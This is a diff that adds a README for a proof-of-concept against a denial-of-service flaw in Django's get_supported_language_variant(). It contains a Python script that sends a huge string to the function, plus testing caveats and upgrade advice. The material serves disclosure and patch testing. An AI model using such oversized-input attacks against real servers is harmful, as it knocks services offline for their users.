@@ -1,0 +1,88 @@
+# Proof of Concept (PoC) for Denial-of-Service Vulnerability in Django
+
+This repository contains a Proof of Concept (PoC) script demonstrating a denial-of-service (DoS) vulnerability in Django versions 5.0 before 5.0.7 and 4.2 before 4.2.14. The vulnerability lies in the `get_supported_language_variant()` function, which is susceptible to a potential DoS attack when handling very long strings containing specific characters.
+
+## Table of Contents
+
+- [Vulnerability Description](#vulnerability-description)
+- [Setup and Usage](#setup-and-usage)
+  - [PoC Script](#poc-script)
+- [Important Considerations](#important-considerations)
+- [Mitigation](#mitigation)
+
+## Vulnerability Description
+
+**CVE-ID**: (Pending)
+
+**Overview**: 
+The `get_supported_language_variant()` function in Django versions 5.0 before 5.0.7 and 4.2 before 4.2.14 is vulnerable to a denial-of-service attack. This function can be exploited by sending very long strings containing specific characters, which could lead to a resource exhaustion and consequently, a denial-of-service condition.
+
+**Affected Versions**: 
+- Django 5.0 before 5.0.7
+- Django 4.2 before 4.2.14
+
+**Fixed Versions**: 
+- Django 5.0.7
+- Django 4.2.14
+
+## Setup and Usage
+
+### Prerequisites
+
+- Python 3.x
+- Django installed (`pip install django`)
+
+### PoC Script
+
+This script demonstrates how an attacker can exploit the vulnerability by sending a very long string to the `get_supported_language_variant()` function.
+
+Save the following script as `dos_poc.py` and run it.
+
+```python
+import django
+from django.utils.translation import get_supported_language_variant
+
+# Check Django version
+if django.VERSION < (4, 2, 14) or (5, 0) <= django.VERSION < (5, 0, 7):
+    print("[-] This Django version is vulnerable to the DoS attack.")
+else:
+    print("[+] This Django version is not vulnerable. Please use a vulnerable version for testing.")
+
+# Generate a very long string containing specific characters
+very_long_string = 'a' * 1000000 + '!'  # Adjust the length and content as necessary
+
+def test_dos_vulnerability():
+    try:
+        # Trigger the vulnerability
+        get_supported_language_variant(very_long_string)
+        print("[+] Successfully called get_supported_language_variant with a very long string.")
+    except Exception as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    test_dos_vulnerability()
+```
+
+### Explanation
+
+1. **Check Django Version**: The script first checks if the installed Django version is vulnerable to the DoS attack.
+2. **Generate a Very Long String**: A very long string containing specific characters is generated. Adjust the length and content as necessary to trigger the vulnerability.
+3. **Test Function**: The `test_dos_vulnerability()` function calls `get_supported_language_variant()` with the very long string to test for the vulnerability.
+4. **Run the Script**: When executed, the script will attempt to exploit the vulnerability and print the results.
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test this vulnerability on the target system. Unauthorized testing is illegal and unethical.
+- **Testing Environment**: Perform this test in a controlled environment to avoid impacting production systems.
+- **Resource Consumption**: This PoC can consume significant system resources. Monitor your system and be prepared to stop the script if necessary.
+
+## Mitigation
+
+To mitigate this vulnerability, upgrade to the fixed versions of Django:
+
+- **Django 5.0.7**
+- **Django 4.2.14**
+
+Follow the official [Django upgrade instructions](https://docs.djangoproject.com/en/stable/howto/upgrade-version/) to update your Django installation to the latest secure version.
+
+By keeping your software up-to-date and following security best practices, you can prevent vulnerabilities such as this DoS issue in Django.
